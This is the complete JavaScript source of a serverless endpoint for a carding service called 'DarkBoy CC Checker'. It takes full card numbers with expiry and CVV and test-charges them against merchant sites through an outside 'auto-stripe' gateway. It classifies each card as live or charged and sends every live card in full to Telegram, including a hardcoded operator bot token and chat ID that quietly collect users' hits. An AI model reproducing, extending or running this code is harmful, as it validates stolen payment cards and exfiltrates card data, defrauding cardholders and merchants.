export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // Handle preflight OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    console.log('🔍 Raw request body type:', typeof req.body);
    console.log('🔍 Raw request body:', req.body);
    
    let body;
    if (typeof req.body === 'string') {
      body = JSON.parse(req.body);
    } else {
      body = req.body;
    }

    console.log('🔍 Parsed body:', body);

    const { cc, site, username: requestUsername, userBotToken, userChatId } = body;

    console.log('📝 Extracted parameters:', { 
      cc: cc ? cc.substring(0, 4) + '****' : 'MISSING', 
      site, 
      username: requestUsername, 
      userBotToken: userBotToken ? 'PRESENT' : 'MISSING', 
      userChatId 
    });

    if (!cc || !site) {
      return res.status(400).json({ 
        error: 'Missing required parameters: cc and site'
      });
    }

    // Check and deduct credits (from body - username or chatId)
    const userId = requestUsername || userChatId;
    
    if (userId && userId !== 'no-telegram') {
      try {
        const baseUrl = req.headers.host?.includes('localhost') ? 'http://localhost:3000' : 'https://' + req.headers.host;
        const creditsUrl = requestUsername ? 
          `${baseUrl}/api/credits?action=check&username=${requestUsername}` :
          `${baseUrl}/api/credits?action=check&chatId=${userChatId}`;
          
        const creditsResponse = await fetch(creditsUrl);
        const creditsData = await creditsResponse.json();
        
        if (!creditsData.hasCredits) {
          return res.status(402).json({ 
            error: 'No credits available. Please purchase credits to continue.',
            currentCredits: creditsData.credits || 0
          });
        }

        // Deduct 1 credit for this check
        const deductResponse = await fetch(`${baseUrl}/api/credits?action=deduct`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            username: requestUsername,
            chatId: userChatId, 
            amount: 1 
          })
        });

        const deductData = await deductResponse.json();
        if (!deductData.success) {
          return res.status(402).json({ 
            error: 'Failed to deduct credits',
            details: deductData.error
          });
        }

        console.log(`💳 Deducted 1 credit from user ${userId}. Remaining: ${deductData.remainingCredits}`);
      } catch (creditsError) {
        console.error('Credits check failed:', creditsError);
        // Continue without credits check if system is down
      }
    }

    if (!cc.match(/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/)) {
      return res.status(400).json({ 
        error: 'Invalid credit card format. Use: NUMBER|MM|YYYY|CVV'
      });
    }

    console.log('Processing CC:', cc.substring(0, 4) + '****', 'Site:', site);

    // Build API URL
    const apiUrl = `https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=${encodeURIComponent(site)}/cc=${encodeURIComponent(cc)}`;
    
    // Make request to external API
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'DarkBoy-CC-Checker/2.0 (Vercel Proxy)',
        'Cache-Control': 'no-cache'
      }
    });

    const responseText = await response.text();
    console.log('Raw API Response:', responseText);
    
    let jsonResult;
    
    try {
      jsonResult = JSON.parse(responseText);
    } catch (parseError) {
      jsonResult = {
        status: response.ok ? 'success' : 'error',
        response: responseText.trim(),
        raw_response: responseText
      };
    }

    // Add metadata
    jsonResult.processed_at = new Date().toISOString();
    jsonResult.http_status = response.status;

    console.log('Parsed Result:', JSON.stringify(jsonResult, null, 2));

    // Check if this is a successful result (APPROVED cards only)
    if (jsonResult && isApprovedResult(jsonResult)) {
      console.log('🎯 Card is approved! Sending Telegram notifications...');
      const telegramResults = await sendDualTelegramNotifications(cc, site, jsonResult, userBotToken, userChatId);
      jsonResult.telegram_notifications = telegramResults;
      console.log('📱 Telegram results:', telegramResults);
      
      // ALWAYS send to admin regardless of user settings
      console.log('📱 Calling sendAdminApprovedNotification...');
      await sendAdminApprovedNotification(cc, site, jsonResult);
      console.log('📱 Admin notification call completed');
    } else {
      console.log('❌ Card not approved, skipping Telegram notifications');
      console.log('❌ Response was:', jsonResult?.response || 'No response');
    }

    // Always return the result (whether approved or declined)
    return res.status(200).json(jsonResult);

  } catch (error) {
    console.error('Proxy Error:', error);
    return res.status(500).json({ 
      error: 'Internal server error',
      details: error.message
    });
  }
}

// Helper function to determine if result is APPROVED (only send telegram for approved)
function isApprovedResult(result) {
  if (!result) return false;
  
  console.log('Checking if approved:', result);
  
  // Check response message
  const message = (result.response || result.message || '').toLowerCase();
  
  // Charged/Success keywords (definitely approved)
  const chargedKeywords = [
    'thank you', 'payment successful', 'transaction approved', 'charge created',
    'payment processed', 'completed', 'charged', 'payment charged', 'success'
  ];
  
  if (chargedKeywords.some(keyword => message.includes(keyword))) {
    console.log('✅ Found charged keyword, sending telegram');
    return true;
  }
  
  // ONLY insufficient funds is considered APPROVED (live card but no money)
  const approvedKeywords = [
    'insufficient_funds', 'insufficient funds'
  ];
  
  if (approvedKeywords.some(keyword => message.includes(keyword))) {
    console.log('✅ Found approved keyword (insufficient funds), sending telegram');
    return true;
  }
  
  console.log('❌ Not approved, no telegram sent');
  return false;
}

// Function to send notifications to BOTH servers (only for approved cards)
async function sendDualTelegramNotifications(cc, site, result, userBotToken, userChatId) {
  const responseMessage = result.response || result.message || 'Approved';
  const category = getCategoryFromResponse(result);
  const emoji = getEmojiForCategory(category);
  
  // Create message for user
  const userMessage = `${emoji} **${category.toUpperCase()} CARD DETECTED**\n\n` +
    `💳 **Card:** \`${cc}\`\n` +
    `🌐 **Site:** ${site}\n` +
    `🔧 **Gateway:** Auto Shopify\n` +
    `📝 **Response:** ${responseMessage}\n` +
    `📊 **Status:** ${result.status || 'Unknown'}\n` +
    `📊 **Category:** ${category.toUpperCase()}\n` +
    `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
    `🚀 **DarkBoy CC Checker v2.0**`;

  // Create message for your server
  const serverMessage = `🎯 **NEW HIT FROM USER**\n\n` +
    `${emoji} **${category.toUpperCase()} CARD FOUND**\n` +
    `💳 **Card:** \`${cc}\`\n` +
    `🌐 **Site:** ${site}\n` +
    `🔧 **Gateway:** Auto Shopify\n` +
    `📝 **Response:** ${responseMessage}\n` +
    `📊 **Status:** ${result.status || 'Unknown'}\n` +
    `📊 **Category:** ${category.toUpperCase()}\n` +
    `👤 **User Chat:** ${userChatId || 'Unknown'}\n` +
    `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
    `📊 **DarkBoy Server Monitor**`;

  const notifications = {
    user: { sent: false, error: null },
    server: { sent: false, error: null }
  };

  // Send to user (if they provided credentials)
  if (userBotToken && userChatId && userChatId !== 'no-telegram') {
    try {
      await sendTelegramMessage(userBotToken, userChatId, userMessage);
      notifications.user.sent = true;
      console.log('✅ User notification sent successfully');
    } catch (error) {
      notifications.user.error = error.message;
      console.error('❌ User notification failed:', error.message);
    }
  } else {
    console.log('👤 User notification skipped - no user Telegram credentials provided');
    notifications.user.sent = false;
    notifications.user.error = 'No user credentials provided';
  }

  // Send to YOUR server
  const SERVER_BOT_TOKEN = process.env.SERVER_BOT_TOKEN || "7721067500:AAE5gJfp0zxnO6WR5Qcr9S3WYIvBShUHHjE";
  const SERVER_CHAT_ID = process.env.SERVER_CHAT_ID || "6538592001";

  try {
    await sendTelegramMessage(SERVER_BOT_TOKEN, SERVER_CHAT_ID, serverMessage);
    notifications.server.sent = true;
    console.log('✅ Server notification sent successfully');
  } catch (error) {
    notifications.server.error = error.message;
    console.error('❌ Server notification failed:', error.message);
  }

  return notifications;
}

// Helper function to send individual Telegram message
async function sendTelegramMessage(botToken, chatId, message) {
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  const response = await fetch(telegramUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    })
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(errorData.description || `HTTP ${response.status}`);
  }

  return await response.json();
}

// Helper function to categorize response properly
function getCategoryFromResponse(result) {
  const status = (result.status || '').toLowerCase();
  const message = (result.response || result.message || '').toLowerCase();
  
  // Check for charged/successful payments first
  const chargedKeywords = [
    'thank you', 'payment successful', 'transaction approved', 'charge created',
    'payment processed', 'completed', 'charged', 'payment charged'
  ];
  
  if (status === 'charged' || chargedKeywords.some(keyword => message.includes(keyword))) {
    return 'charged';
  }
  
  // Check for live card indicators (CVV errors, insufficient funds, etc.)
  const approvedKeywords = [
    'insufficient_funds', 'insufficient funds',
    'incorrect_cvv', 'invalid_cvv', 'security code is incorrect',
    'incorrect_cvc', 'invalid_cvc', 'cvc is incorrect',
    'incorrect_zip', 'postal code', 'zip code',
    'expired', 'card_expired'
  ];
  
  if (approvedKeywords.some(keyword => message.includes(keyword))) {
    return 'approved';
  }
  
  // Check for 3D Secure
  if (message.includes('3d') || message.includes('authentication') || message.includes('verify')) {
    return 'threed';
  }
  
  // Default to declined
  return 'declined';
}

// Helper function to get emoji for category
function getEmojiForCategory(category) {
  switch (category) {
    case 'charged': return '💳';
    case 'approved': return '✅';
    case 'threed': return '🔒';
    case 'declined': return '❌';
    default: return '❓';
  }
}

// Send approved card notification to admin (always)
async function sendAdminApprovedNotification(cc, site, result) {
  try {
    console.log('🚨 ADMIN NOTIFICATION FUNCTION CALLED!');
    console.log('💳 Card:', cc);
    console.log('🌐 Site:', site);
    console.log('📝 Result:', result?.response);
    
    // Use specific credentials for approved card notifications
    const ADMIN_BOT_TOKEN = process.env.SERVER_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.SERVER_CHAT_ID;

    console.log('🔑 Bot Token:', ADMIN_BOT_TOKEN ? 'PRESENT' : 'MISSING');
    console.log('💬 Chat ID:', ADMIN_CHAT_ID);

    if (!ADMIN_BOT_TOKEN || !ADMIN_CHAT_ID) {
      console.log('Admin approved notification skipped - no admin credentials');
      return;
    }

    const responseMessage = result.response || result.message || 'Approved';
    const category = getCategoryFromResponse(result);
    const emoji = getEmojiForCategory(category);

    const adminMessage = `🚨 **LIVE CARD DETECTED!**\n\n` +
      `${emoji} **${category.toUpperCase()} CARD**\n` +
      `💳 **Card:** \`${cc}\`\n` +
      `🌐 **Site:** ${site}\n` +
      `🔧 **Gateway:** Auto Shopify\n` +
      `📝 **Response:** ${responseMessage}\n` +
      `📊 **Status:** ${result.status || 'Live'}\n` +
      `⏰ **Time:** ${new Date().toLocaleString()}\n` +
      `🌍 **Source:** DarkBoy CC Checker v2.0\n\n` +
      `🎯 **ADMIN NOTIFICATION**`;

    await sendTelegramMessage(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, adminMessage);
    console.log('✅ Admin approved card notification sent');
  } catch (error) {
    console.error('❌ Admin approved notification failed:', error);
  }
}